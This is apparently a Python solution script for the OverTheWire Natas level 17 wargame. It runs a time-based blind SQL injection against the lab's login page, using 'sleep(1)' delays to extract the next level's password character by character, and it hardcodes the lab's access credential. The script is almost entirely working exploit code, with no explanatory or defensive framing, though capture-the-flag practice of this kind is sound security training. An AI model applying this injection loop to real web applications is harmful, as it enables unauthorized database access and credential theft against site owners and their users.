import requests
from requests.auth import HTTPBasicAuth

passchars = "a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z"
temp = passchars.split(",")
possible = []
for char in temp:
	possible.append(char)
	possible.append(char.upper())
for i in range(0,10):
	possible.append(str(i))

updatedpossible = []
passwd = ''

for element in possible:
	Query = 'username=natas18%22+and+password+like+binary+%27%25{}%25%27+and+sleep%281%29+%23'.format(element)
	r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data = Query,headers={'content-type': 'application/x-www-form-urlencoded'} )
	if(r.elapsed.seconds>=1):
		updatedpossible.append(element)
print("Found Possible Characters: ", updatedpossible)
for i in range(0,32):
	for element in updatedpossible:
		Query = 'username=natas18%22+and+password+like+binary+%27{}{}%25%27+and+sleep%281%29+%23'.format(passwd,element)
		r = requests.post('http://natas17.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data = Query,headers={'content-type': 'application/x-www-form-urlencoded'} )
		if(r.elapsed.seconds>=1):
			passwd += element
			print("Found password character at position: ",i," ",element)
			break
print(passwd)
